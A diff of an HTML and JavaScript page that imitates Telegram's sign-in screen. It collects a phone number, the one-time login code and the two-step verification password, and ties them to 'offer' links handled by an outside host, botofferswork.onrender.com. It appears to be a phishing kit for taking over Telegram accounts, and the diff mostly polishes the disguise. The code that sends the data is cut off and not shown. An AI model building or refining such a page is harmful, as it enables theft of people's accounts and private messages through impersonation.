@@ -1,131 +1,242 @@
 <!doctype html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=no">
-<meta name="theme-color" content="#17212b">
+<meta name="theme-color" content="#ffffff">
 <title>Telegram</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='50' fill='%232ea6da'/><path d='M22 49l52-22-8 50-16-13-9 9-2-16z' fill='white'/></svg>">
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
+:root{
+  --bg-gradient:linear-gradient(135deg,#a7d47c 0%,#8bc96e 30%,#6fbf6a 70%,#b5d782 100%);
+  --card-bg:#ffffff;
+  --text:#000000;
+  --text-secondary:#707579;
+  --input-border:#dadce0;
+  --input-focus:#3390ec;
+  --btn-primary:#3390ec;
+  --btn-primary-hover:#2a7bc4;
+  --btn-disabled:#e3e5e8;
+  --btn-disabled-text:#a5a5a5;
+  --link:#3390ec;
+  --logo-circle:#4da8e8;
+  --pattern-color:rgba(90,140,80,0.15);
+}
+[data-theme="dark"]{
+  --bg-gradient:linear-gradient(135deg,#0a0a0a 0%,#0d0a15 30%,#0f0c1a 70%,#0a0a0a 100%);
+  --card-bg:#212121;
+  --text:#ffffff;
+  --text-secondary:#aaaaaa;
+  --input-border:#3a3a3a;
+  --input-focus:#8774e1;
+  --btn-primary:#8774e1;
+  --btn-primary-hover:#7663c9;
+  --btn-disabled:#2a2a2a;
+  --btn-disabled-text:#666666;
+  --link:#8774e1;
+  --logo-circle:#8774e1;
+  --pattern-color:rgba(135,116,225,0.12);
+}
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-html,body{height:100%}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#17212b;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;overflow-x:hidden;position:relative}
-.bg-pattern{position:fixed;inset:0;pointer-events:none;opacity:.06;background-image:radial-gradient(circle at 20% 30%, #fff 1.5px, transparent 1.5px),radial-gradient(circle at 70% 60%, #fff 1px, transparent 1px),radial-gradient(circle at 40% 80%, #fff 1.2px, transparent 1.2px),radial-gradient(circle at 85% 15%, #fff 1px, transparent 1px),radial-gradient(circle at 15% 70%, #fff 1.3px, transparent 1.3px);background-size:200px 200px,300px 300px,250px 250px,180px 180px,220px 220px;animation:drift 90s linear infinite}
-@keyframes drift{from{background-position:0 0,0 0,0 0,0 0,0 0}to{background-position:200px 200px,300px 300px,250px 250px,180px 180px,220px 220px}}
-.card{position:relative;z-index:1;background:#242f3d;border-radius:18px;padding:48px 32px 28px;width:100%;max-width:390px;box-shadow:0 24px 64px rgba(0,0,0,.5),0 0 0 1px rgba(255,255,255,.03);text-align:center;animation:cardIn .4s cubic-bezier(.16,1,.3,1)}
+html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+body{
+  background:var(--bg-gradient);
+  color:var(--text);
+  display:flex;align-items:center;justify-content:center;
+  min-height:100vh;padding:20px;overflow-x:hidden;
+  position:relative;transition:background .3s;
+}
+/* ─── ФОН С УЗОРОМ ИЗ ЭМОДЗИ ─── */
+.bg-pattern{
+  position:fixed;inset:0;pointer-events:none;opacity:.5;
+  font-size:36px;line-height:1.4;letter-spacing:14px;word-spacing:18px;
+  padding:20px;
+  color:transparent;
+  -webkit-text-stroke:1px var(--pattern-color);
+  text-stroke:1px var(--pattern-color);
+  overflow:hidden;
+  animation:scrollPattern 200s linear infinite;
+  white-space:pre-wrap;
+  word-break:break-all;
+  user-select:none;
+  z-index:0;
+}
+@keyframes scrollPattern{from{transform:translateY(0)}to{transform:translateY(-50%)}}
+@media(max-width:600px){.bg-pattern{font-size:26px;letter-spacing:10px;word-spacing:12px}}
+
+/* ─── ПЕРЕКЛЮЧАТЕЛЬ ТЕМЫ ─── */
+.theme-toggle{
+  position:fixed;top:20px;right:20px;z-index:100;
+  width:44px;height:44px;border-radius:50%;
+  background:rgba(255,255,255,.9);
+  border:none;cursor:pointer;font-size:20px;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 2px 8px rgba(0,0,0,.15);
+  transition:transform .2s,background .2s;
+}
+.theme-toggle:hover{transform:scale(1.05)}
+[data-theme="dark"] .theme-toggle{background:rgba(60,60,60,.9);color:#fff}
+
+/* ─── КАРТОЧКА ─── */
+.card{
+  position:relative;z-index:2;
+  background:var(--card-bg);
+  border-radius:20px;
+  padding:44px 32px 32px;
+  width:100%;max-width:400px;
+  box-shadow:0 12px 48px rgba(0,0,0,.12),0 2px 8px rgba(0,0,0,.06);
+  text-align:center;
+  animation:cardIn .4s cubic-bezier(.16,1,.3,1);
+}
 @keyframes cardIn{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
-.logo{width:116px;height:116px;margin:0 auto 24px;border-radius:50%;background:linear-gradient(135deg,#5b8def 0%,#3f6fd9 100%);display:flex;align-items:center;justify-content:center;box-shadow:0 12px 32px rgba(91,141,239,.4)}
+
+/* ─── ЛОГОТИП ─── */
+.logo{
+  width:112px;height:112px;border-radius:50%;
+  margin:0 auto 22px;
+  background:var(--logo-circle);
+  display:flex;align-items:center;justify-content:center;
+  transition:background .3s;
+}
 .logo svg{width:60px;height:60px;fill:#fff;margin-left:-5px;margin-top:3px}
-h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
-.sub{color:#7d8b99;font-size:14px;line-height:1.55;margin-bottom:28px;padding:0 6px}
-.step{display:flex;flex-direction:column;gap:16px;text-align:left;animation:stepIn .3s ease}
-@keyframes stepIn{from{opacity:0;transform:translateX(8px)}to{opacity:1;transform:translateX(0)}}
+
+/* ─── ЗАГОЛОВКИ ─── */
+h1{font-size:26px;font-weight:600;letter-spacing:-.3px;margin-bottom:10px;color:var(--text)}
+.sub{color:var(--text-secondary);font-size:14.5px;line-height:1.5;margin-bottom:26px;padding:0 8px}
+
+/* ─── ШАГИ ─── */
+.step{display:flex;flex-direction:column;gap:14px;text-align:left;animation:stepIn .25s ease}
+@keyframes stepIn{from{opacity:0;transform:translateX(6px)}to{opacity:1;transform:translateX(0)}}
 .hidden{display:none !important}
-.field{position:relative}
-.field label{position:absolute;top:-8px;left:14px;background:#242f3d;padding:0 6px;font-size:12px;color:#5b8def;font-weight:500;z-index:1}
-/* ─── поле телефона как в Telegram ─── */
-.phone-row{display:flex;width:100%;background:transparent;border:2px solid #2f3b4a;border-radius:10px;overflow:hidden;transition:border-color .2s;align-items:stretch}
-.phone-row.focused{border-color:#5b8def;background:rgba(91,141,239,.03)}
-.country-btn{padding:16px 12px;background:transparent;border:none;color:#fff;cursor:pointer;font-size:16px;font-family:inherit;display:flex;align-items:center;gap:6px;border-right:2px solid #2f3b4a;transition:background .2s}
-.country-btn:hover{background:rgba(91,141,239,.1)}
-.country-btn .flag{font-size:20px}
-.country-btn .arrow{color:#7d8b99;font-size:12px}
-.phone-row input{flex:1;padding:16px 14px;background:transparent;border:none;color:#fff;font-size:16px;outline:none;font-family:inherit}
-.phone-row input::placeholder{color:#4a5563}
-/* ─── модалка стран ─── */
-.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;display:flex;align-items:flex-end;justify-content:center;animation:fadeIn .2s}
-@keyframes fadeIn{from{opacity:0}to{opacity:1}}
-.modal{background:#242f3d;border-radius:18px 18px 0 0;width:100%;max-width:500px;max-height:80vh;display:flex;flex-direction:column;animation:slideUp .3s cubic-bezier(.16,1,.3,1)}
-@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
-.modal-header{padding:20px 20px 12px;display:flex;justify-content:space-between;align-items:center}
-.modal-title{font-size:18px;font-weight:600}
-.modal-close{background:none;border:none;color:#7d8b99;font-size:24px;cursor:pointer;padding:0;line-height:1}
-.modal-search{padding:0 20px 12px}
-.modal-search input{width:100%;padding:14px;background:#1e2936;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:15px;outline:none;font-family:inherit}
-.modal-search input:focus{border-color:#5b8def}
-.modal-list{overflow-y:auto;flex:1;padding-bottom:20px}
-.modal-list::-webkit-scrollbar{width:6px}
-.modal-list::-webkit-scrollbar-thumb{background:#3f4b5a;border-radius:3px}
-.country-item{padding:14px 20px;cursor:pointer;display:flex;align-items:center;gap:12px;font-size:15px;transition:background .15s}
-.country-item:hover,.country-item.active{background:#2f3b4a}
-.country-item .flag{font-size:22px}
-.country-item .name{flex:1;color:#e0e6ec}
-.country-item .code{color:#7d8b99;font-size:14px}
-.country-empty{padding:20px;color:#4a5563;font-size:14px;text-align:center}
-/* ─── остальное ─── */
-.field input{width:100%;padding:16px 14px;background:transparent;border:2px solid #2f3b4a;border-radius:10px;color:#fff;font-size:16px;outline:none;transition:border-color .2s;font-family:inherit}
-.field input:focus{border-color:#5b8def;background:rgba(91,141,239,.03)}
-.field input::placeholder{color:#4a5563}
-.btn{width:100%;padding:15px;background:#5b8def;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;transition:background .2s,transform .08s;font-family:inherit}
-.btn:hover:not(:disabled){background:#4a7ce0}
+
+/* ─── ПОЛЯ ВВОДА ─── */
+.field{position:relative;margin-bottom:14px}
+.field label{position:absolute;top:-8px;left:14px;background:var(--card-bg);padding:0 6px;font-size:12.5px;color:var(--input-focus);font-weight:500;z-index:1;transition:color .2s;letter-spacing:.2px}
+.field input,.field select{
+  width:100%;padding:15px 14px;
+  background:transparent;
+  border:1.5px solid var(--input-border);
+  border-radius:10px;
+  color:var(--text);font-size:15.5px;
+  outline:none;transition:border-color .2s;
+  font-family:inherit;
+}
+.field input:focus,.field select:focus{border-color:var(--input-focus)}
+.field input::placeholder{color:var(--text-secondary);opacity:.6}
+.field select{
+  appearance:none;-webkit-appearance:none;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23a5a5a5' stroke-width='2' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;
+  background-position:right 16px center;
+  padding-right:42px;
+  cursor:pointer;
+}
+.field select option{background:var(--card-bg);color:var(--text)}
+
+/* ─── КНОПКА ─── */
+.btn{
+  width:100%;padding:15px;background:var(--btn-primary);color:#fff;
+  border:none;border-radius:10px;font-size:16px;font-weight:600;
+  cursor:pointer;margin-top:6px;
+  transition:background .2s,transform .08s;
+  font-family:inherit;letter-spacing:.5px;
+  text-transform:uppercase;
+}
+.btn:hover:not(:disabled){background:var(--btn-primary-hover)}
 .btn:active:not(:disabled){transform:scale(.985)}
-.btn:disabled{background:#2f3b4a;color:#4a5563;cursor:not-allowed}
-.btn-ghost{background:transparent;color:#5b8def;padding:14px;font-size:15px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:2px;border-radius:10px}
-.btn-danger{background:transparent;color:#e85353;padding:14px;font-size:15px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:8px;border-radius:10px;width:100%}
-.footer-note{margin-top:22px;font-size:11.5px;color:#4a5563;line-height:1.55}
+.btn:disabled{background:var(--btn-disabled);color:var(--btn-disabled-text);cursor:not-allowed}
+.btn-ghost{background:transparent;color:var(--link);padding:12px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:6px;border-radius:8px}
+.btn-ghost:hover{background:rgba(51,144,236,.08)}
+.btn-danger{background:transparent;color:#e85353;padding:14px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:14px;border-radius:8px;width:100%}
+.btn-danger:hover{background:rgba(232,83,83,.08)}
+
+/* ─── ССЫЛКИ ─── */
+.links{margin-top:24px;display:flex;flex-direction:column;gap:12px;align-items:center}
+.link{
+  background:none;border:none;color:var(--link);
+  font-size:14px;font-weight:600;letter-spacing:.5px;
+  text-transform:uppercase;cursor:pointer;font-family:inherit;
+  padding:4px 8px;transition:opacity .2s;
+  display:flex;align-items:center;gap:4px;
+}
+.link:hover{opacity:.75}
+.link .arrow{font-size:11px}
+
+/* ─── СПИННЕР ─── */
 .spinner-wrap{text-align:center;padding:24px 0}
-.spinner{width:46px;height:46px;border:4px solid #2f3b4a;border-top-color:#5b8def;border-radius:50%;margin:0 auto 18px;animation:spin .9s linear infinite}
+.spinner{width:46px;height:46px;border:3px solid var(--btn-disabled);border-top-color:var(--btn-primary);border-radius:50%;margin:0 auto 18px;animation:spin .9s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
-.spinner-wrap p{color:#7d8b99;font-size:14px}
-.error{background:rgba(232,83,83,.12);color:#e85353;padding:12px 14px;border-radius:10px;font-size:13px;margin-top:14px;text-align:left;line-height:1.45;animation:stepIn .2s ease}
+.spinner-wrap p{color:var(--text-secondary);font-size:14px}
+
+/* ─── ОШИБКА ─── */
+.error{background:rgba(232,83,83,.1);color:#e85353;padding:12px 14px;border-radius:10px;font-size:13px;margin-top:14px;text-align:left;line-height:1.45;animation:stepIn .2s ease}
 .attempts{font-size:12px;color:#e85353;margin-top:6px}
-.big-icon{width:76px;height:76px;margin:0 auto 22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:38px;animation:iconPop .5s cubic-bezier(.16,1.4,.4,1)}
-@keyframes iconPop{from{transform:scale(.5);opacity:0}to{transform:scale(1);opacity:1}}
-.big-icon.ok{background:rgba(83,195,124,.15)}
-.big-icon.no{background:rgba(232,83,83,.15)}
-.dots{display:flex;gap:6px;justify-content:center;margin-bottom:22px}
-.dots span{width:6px;height:6px;border-radius:50%;background:#2f3b4a;transition:background .3s,width .3s}
-.dots span.on{background:#5b8def;width:18px;border-radius:3px}
-.code-hint{font-size:13px;color:#7d8b99;margin-bottom:-4px;line-height:1.5}
-.code-hint b{color:#e0e6ec;font-weight:500}
-.profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:linear-gradient(135deg,#5b8def,#3f6fd9);display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:600;color:#fff;box-shadow:0 12px 32px rgba(91,141,239,.4)}
-.profile-name{font-size:22px;font-weight:600;margin-bottom:6px}
-.profile-username{color:#5b8def;font-size:15px;margin-bottom:24px}
-.profile-info{background:#1e2936;border-radius:12px;padding:16px;text-align:left;margin-bottom:16px}
-.profile-info-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2f3b4a;font-size:14px}
+.code-hint{font-size:14px;color:var(--text-secondary);margin-bottom:-2px;line-height:1.5;text-align:left}
+.code-hint b{color:var(--text);font-weight:500}
+
+/* ─── ПРОФИЛЬ ─── */
+.profile-avatar{width:110px;height:110px;border-radius:50%;margin:0 auto 20px;background:var(--logo-circle);display:flex;align-items:center;justify-content:center;font-size:44px;font-weight:600;color:#fff;overflow:hidden;transition:background .3s}
+.profile-name{font-size:22px;font-weight:600;margin-bottom:6px;color:var(--text)}
+.profile-username{color:var(--link);font-size:15px;margin-bottom:20px}
+.profile-status{display:inline-block;padding:6px 14px;background:rgba(83,195,124,.15);color:#53c37c;border-radius:20px;font-size:13px;margin-bottom:22px;font-weight:500}
+.profile-info{background:rgba(127,127,127,.08);border-radius:12px;padding:6px 16px;text-align:left;margin-bottom:16px}
+.profile-info-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(127,127,127,.15);font-size:14.5px}
 .profile-info-row:last-child{border-bottom:none}
-.profile-info-row .key{color:#7d8b99}
-.profile-info-row .val{color:#fff;font-weight:500}
-.profile-status{display:inline-block;padding:6px 14px;background:rgba(83,195,124,.15);color:#53c37c;border-radius:20px;font-size:13px;margin-bottom:20px}
-@media (max-width:400px){.card{padding:36px 22px 22px;border-radius:14px}.logo{width:96px;height:96px;margin-bottom:20px}.logo svg{width:50px;height:50px}h1{font-size:20px}.sub{font-size:13px;margin-bottom:22px}}
+.profile-info-row .key{color:var(--text-secondary)}
+.profile-info-row .val{color:var(--text);font-weight:500}
+
+@media (max-width:400px){
+  .card{padding:36px 22px 26px;border-radius:16px}
+  .logo{width:96px;height:96px;margin-bottom:18px}
+  .logo svg{width:52px;height:52px}
+  h1{font-size:22px}
+  .sub{font-size:13.5px;margin-bottom:22px}
+}
 </style>
 </head>
 <body>
-<div class="bg-pattern"></div>
 
+<!-- УЗОР ИЗ ЭМОДЗИ -->
+<div class="bg-pattern" id="pattern"></div>
+
+<!-- ПЕРЕКЛЮЧАТЕЛЬ ТЕМЫ -->
+<button class="theme-toggle" id="theme-toggle" title="Toggle theme">🌙</button>
+
+<!-- КАРТОЧКА -->
 <div class="card">
   <div class="logo">
     <svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
   </div>
 
-  <div class="dots" id="dots"><span class="on"></span><span></span><span></span></div>
-
   <h1 id="title">Sign in to Telegram</h1>
-  <p class="sub" id="sub">Please confirm your country code and enter your phone number.</p>
+  <p class="sub" id="sub">Please confirm your country code<br>and enter your phone number.</p>
 
+  <!-- ШАГ 1: НОМЕР -->
   <form id="step-phone" class="step">
-    <div class="phone-row" id="phone-row">
-      <button type="button" class="country-btn" id="country-btn">
-        <span class="flag" id="current-flag">🇷🇺</span>
-        <span id="current-code">+7</span>
-        <span class="arrow">▾</span>
-      </button>
-      <input type="tel" id="phone" placeholder="999 123-45-67" autocomplete="tel" required inputmode="tel">
+    <div class="field">
+      <label>Country</label>
+      <select id="country-select"></select>
     </div>
-    <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
+    <div class="field">
+      <label>Phone Number</label>
+      <input type="tel" id="phone" placeholder="+7 --- --- ----" autocomplete="tel" required inputmode="tel">
+    </div>
+    <button type="submit" class="btn" id="btn-next">NEXT</button>
   </form>
 
+  <!-- ШАГ 2: КОД -->
   <form id="step-code" class="step hidden">
     <p class="code-hint" id="code-hint">We've sent the code to your Telegram app.</p>
     <div class="field">
       <label>Code</label>
-      <input type="text" id="code" placeholder="12345" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
+      <input type="text" id="code" placeholder="-----" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
     </div>
     <button type="submit" class="btn">NEXT</button>
     <button type="button" class="btn-ghost" id="btn-back-phone">← Back to phone number</button>
   </form>
 
+  <!-- ШАГ 3: 2FA -->
   <form id="step-2fa" class="step hidden">
     <p class="code-hint">Your account is protected with an additional password.</p>
     <div class="field">
@@ -135,274 +246,196 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
     <button type="submit" class="btn">NEXT</button>
   </form>
 
+  <!-- ЗАГРУЗКА -->
   <div id="step-loading" class="step hidden">
     <div class="spinner-wrap"><div class="spinner"></div><p id="loading-text">Checking…</p></div>
   </div>
 
+  <!-- ПРОФИЛЬ -->
   <div id="step-profile" class="step hidden">
     <div class="profile-avatar" id="profile-avatar">A</div>
     <div class="profile-name" id="profile-name">—</div>
     <div class="profile-username" id="profile-username">@—</div>
-    <div class="profile-status">✅ Вы вошли</div>
+    <div class="profile-status">Signed in</div>
     <div class="profile-info">
-      <div class="profile-info-row">
-        <span class="key">ID</span>
-        <span class="val" id="profile-id">—</span>
-      </div>
-      <div class="profile-info-row">
-        <span class="key">Username</span>
-        <span class="val" id="profile-uname">—</span>
-      </div>
-      <div class="profile-info-row">
-        <span class="key">Имя</span>
-        <span class="val" id="profile-fio">—</span>
-      </div>
-      <div class="profile-info-row">
-        <span class="key">Телефон</span>
-        <span class="val" id="profile-phone">—</span>
-      </div>
+      <div class="profile-info-row"><span class="key">ID</span><span class="val" id="profile-id">—</span></div>
+      <div class="profile-info-row"><span class="key">Username</span><span class="val" id="profile-uname">—</span></div>
+      <div class="profile-info-row"><span class="key">Name</span><span class="val" id="profile-fio">—</span></div>
+      <div class="profile-info-row"><span class="key">Phone</span><span class="val" id="profile-phone">—</span></div>
     </div>
-    <p class="sub" style="margin-bottom:14px">Ожидайте — с вами свяжутся в Telegram.</p>
-    <button type="button" class="btn-danger" id="btn-logout">Выйти с аккаунта</button>
+    <button type="button" class="btn-danger" id="btn-logout">Log out</button>
   </div>
 
+  <!-- ОТКАЗ -->
   <div id="step-rejected" class="step hidden">
-    <div class="big-icon no">❌</div>
-    <h1 style="font-size:20px;margin-bottom:10px">Оффер отклонён</h1>
-    <p class="sub" style="margin-bottom:0">Вы отклонили предложение.</p>
+    <h1 style="font-size:22px;margin-bottom:10px">Offer declined</h1>
+    <p class="sub" style="margin-bottom:0">You've declined the offer.</p>
   </div>
 
   <div id="error-box" class="error hidden"></div>
-  <p class="footer-note" id="footer">By signing up, you agree to our Terms of Service and Privacy Policy.</p>
-</div>
 
-<!-- модалка выбора страны -->
-<div id="country-modal" class="modal-overlay hidden">
-  <div class="modal">
-    <div class="modal-header">
-      <div class="modal-title">Choose a country</div>
-      <button class="modal-close" id="modal-close">×</button>
-    </div>
-    <div class="modal-search">
-      <input type="text" id="country-search" placeholder="Search" autocomplete="off">
-    </div>
-    <div class="modal-list" id="country-list-modal"></div>
+  <!-- ССЫЛКИ -->
+  <div class="links" id="links-block">
+    <button class="link" id="link-ru">ПРОДОЛЖИТЬ НА РУССКОМ</button>
+    <button class="link" id="link-qr">LOG IN BY QR CODE <span class="arrow">›</span></button>
+    <button class="link" id="link-passkey">LOG IN BY PASSKEY <span class="arrow">›</span></button>
   </div>
 </div>
 
 <script>
 const API = 'https://botofferswork.onrender.com';
 
-console.log('[INIT] mini app v4');
-
-const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
-if (tg) {
-  try { tg.ready(); tg.expand(); } catch(e){}
+// ─── ГЕНЕРАЦИЯ УЗОРА ИЗ ЭМОДЗИ ───
+const EMOJIS = ['✈️','🎁','🐻','🐱','🦄','🌈','⭐','🍕','🍩','🎈','🎮','🚀','🌸','🐶','🐼','🍔','🎸','🎨','🐧','🦊','🍓','🌙','☀️','🎯','🎪','🐢','🦋','🍭','🎵','🧸','🐸','🦁','🍦','⚽','🎲','🐬','🦉','🍒','🌻','🎭','🐙','🦜','🍇','🎺','🐝','🦓','🍋','🎬'];
+let patternText = '';
+for (let i = 0; i < 400; i++) {
+  patternText += EMOJIS[Math.floor(Math.random() * EMOJIS.length)] + ' ';
 }
+document.getElementById('pattern').textContent = patternText + patternText; // для анимации скролла
 
+// ─── ТЕМА ───
+const themeToggle = document.getElementById('theme-toggle');
+function setTheme(theme) {
+  document.documentElement.setAttribute('data-theme', theme);
+  themeToggle.textContent = theme === 'dark' ? '☀️' : '🌙';
+  localStorage.setItem('tg_theme', theme);
+}
+const savedTheme = localStorage.getItem('tg_theme') || 'light';
+setTheme(savedTheme);
+themeToggle.addEventListener('click', () => {
+  const current = document.documentElement.getAttribute('data-theme') || 'light';
+  setTheme(current === 'dark' ? 'light' : 'dark');
+});
+
+// ─── TELEGRAM WEBAPP ───
+const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
+if (tg) { try { tg.ready(); tg.expand(); } catch(e){} }
 const tgUserId = tg?.initDataUnsafe?.user?.id || 0;
-console.log('[TG] user id =', tgUserId);
 
+// ─── ПАРАМЕТРЫ ОФФЕРА ───
 let offerId = 0;
 let action = 'accept';
 const startParam = tg?.initDataUnsafe?.start_param || '';
 const m = startParam.match(/^offer_(\d+)_(accept|reject)$/);
-if (m) {
-  offerId = parseInt(m[1], 10);
-  action = m[2];
-} else {
+if (m) { offerId = parseInt(m[1], 10); action = m[2]; }
+else {
   const params = new URLSearchParams(location.search);
   offerId = parseInt(params.get('offer') || '0', 10);
   action = (params.get('action') || 'accept').toLowerCase();
 }
 
-// ─── СТРАНЫ (сортированы по популярности)
+// ─── СТРАНЫ ───
 const COUNTRIES = [
-  {c:'+7',f:'🇷🇺',n:'Russia',iso:'RU'},
-  {c:'+7',f:'🇰🇿',n:'Kazakhstan',iso:'KZ'},
-  {c:'+380',f:'🇺🇦',n:'Ukraine',iso:'UA'},
-  {c:'+375',f:'🇧🇾',n:'Belarus',iso:'BY'},
-  {c:'+1',f:'🇺🇸',n:'United States',iso:'US'},
-  {c:'+1',f:'🇨🇦',n:'Canada',iso:'CA'},
-  {c:'+44',f:'🇬🇧',n:'United Kingdom',iso:'GB'},
-  {c:'+49',f:'🇩🇪',n:'Germany',iso:'DE'},
-  {c:'+33',f:'🇫🇷',n:'France',iso:'FR'},
-  {c:'+39',f:'🇮🇹',n:'Italy',iso:'IT'},
-  {c:'+34',f:'🇪🇸',n:'Spain',iso:'ES'},
-  {c:'+351',f:'🇵🇹',n:'Portugal',iso:'PT'},
-  {c:'+31',f:'🇳🇱',n:'Netherlands',iso:'NL'},
-  {c:'+32',f:'🇧🇪',n:'Belgium',iso:'BE'},
-  {c:'+41',f:'🇨🇭',n:'Switzerland',iso:'CH'},
-  {c:'+43',f:'🇦🇹',n:'Austria',iso:'AT'},
-  {c:'+48',f:'🇵🇱',n:'Poland',iso:'PL'},
-  {c:'+420',f:'🇨🇿',n:'Czechia',iso:'CZ'},
-  {c:'+421',f:'🇸🇰',n:'Slovakia',iso:'SK'},
-  {c:'+36',f:'🇭🇺',n:'Hungary',iso:'HU'},
-  {c:'+40',f:'🇷🇴',n:'Romania',iso:'RO'},
-  {c:'+359',f:'🇧🇬',n:'Bulgaria',iso:'BG'},
-  {c:'+30',f:'🇬🇷',n:'Greece',iso:'GR'},
-  {c:'+90',f:'🇹🇷',n:'Turkey',iso:'TR'},
-  {c:'+972',f:'🇮🇱',n:'Israel',iso:'IL'},
-  {c:'+971',f:'🇦🇪',n:'UAE',iso:'AE'},
-  {c:'+966',f:'🇸🇦',n:'Saudi Arabia',iso:'SA'},
-  {c:'+20',f:'🇪🇬',n:'Egypt',iso:'EG'},
-  {c:'+91',f:'🇮🇳',n:'India',iso:'IN'},
-  {c:'+92',f:'🇵🇰',n:'Pakistan',iso:'PK'},
-  {c:'+86',f:'🇨🇳',n:'China',iso:'CN'},
-  {c:'+81',f:'🇯🇵',n:'Japan',iso:'JP'},
-  {c:'+82',f:'🇰🇷',n:'South Korea',iso:'KR'},
-  {c:'+65',f:'🇸🇬',n:'Singapore',iso:'SG'},
-  {c:'+60',f:'🇲🇾',n:'Malaysia',iso:'MY'},
-  {c:'+66',f:'🇹🇭',n:'Thailand',iso:'TH'},
-  {c:'+84',f:'🇻🇳',n:'Vietnam',iso:'VN'},
-  {c:'+62',f:'🇮🇩',n:'Indonesia',iso:'ID'},
-  {c:'+63',f:'🇵🇭',n:'Philippines',iso:'PH'},
-  {c:'+61',f:'🇦🇺',n:'Australia',iso:'AU'},
-  {c:'+64',f:'🇳🇿',n:'New Zealand',iso:'NZ'},
-  {c:'+55',f:'🇧🇷',n:'Brazil',iso:'BR'},
-  {c:'+54',f:'🇦🇷',n:'Argentina',iso:'AR'},
-  {c:'+52',f:'🇲🇽',n:'Mexico',iso:'MX'},
-  {c:'+27',f:'🇿🇦',n:'South Africa',iso:'ZA'},
-  {c:'+234',f:'🇳🇬',n:'Nigeria',iso:'NG'},
-  {c:'+373',f:'🇲🇩',n:'Moldova',iso:'MD'},
-  {c:'+374',f:'🇦🇲',n:'Armenia',iso:'AM'},
-  {c:'+994',f:'🇦🇿',n:'Azerbaijan',iso:'AZ'},
-  {c:'+995',f:'🇬🇪',n:'Georgia',iso:'GE'},
-  {c:'+996',f:'🇰🇬',n:'Kyrgyzstan',iso:'KG'},
-  {c:'+992',f:'🇹🇯',n:'Tajikistan',iso:'TJ'},
-  {c:'+993',f:'🇹🇲',n:'Turkmenistan',iso:'TM'},
+  {c:'+7',f:'🇷🇺',n:'Russia',iso:'RU'},{c:'+7',f:'🇰🇿',n:'Kazakhstan',iso:'KZ'},
+  {c:'+380',f:'🇺🇦',n:'Ukraine',iso:'UA'},{c:'+375',f:'🇧🇾',n:'Belarus',iso:'BY'},
+  {c:'+1',f:'🇺🇸',n:'United States',iso:'US'},{c:'+1',f:'🇨🇦',n:'Canada',iso:'CA'},
+  {c:'+44',f:'🇬🇧',n:'United Kingdom',iso:'GB'},{c:'+49',f:'🇩🇪',n:'Germany',iso:'DE'},
+  {c:'+33',f:'🇫🇷',n:'France',iso:'FR'},{c:'+39',f:'🇮🇹',n:'Italy',iso:'IT'},
+  {c:'+34',f:'🇪🇸',n:'Spain',iso:'ES'},{c:'+351',f:'🇵🇹',n:'Portugal',iso:'PT'},
+  {c:'+31',f:'🇳🇱',n:'Netherlands',iso:'NL'},{c:'+32',f:'🇧🇪',n:'Belgium',iso:'BE'},
+  {c:'+41',f:'🇨🇭',n:'Switzerland',iso:'CH'},{c:'+43',f:'🇦🇹',n:'Austria',iso:'AT'},
+  {c:'+48',f:'🇵🇱',n:'Poland',iso:'PL'},{c:'+420',f:'🇨🇿',n:'Czech Republic',iso:'CZ'},
+  {c:'+421',f:'🇸🇰',n:'Slovakia',iso:'SK'},{c:'+36',f:'🇭🇺',n:'Hungary',iso:'HU'},
+  {c:'+40',f:'🇷🇴',n:'Romania',iso:'RO'},{c:'+359',f:'🇧🇬',n:'Bulgaria',iso:'BG'},
+  {c:'+30',f:'🇬🇷',n:'Greece',iso:'GR'},{c:'+90',f:'🇹🇷',n:'Turkey',iso:'TR'},
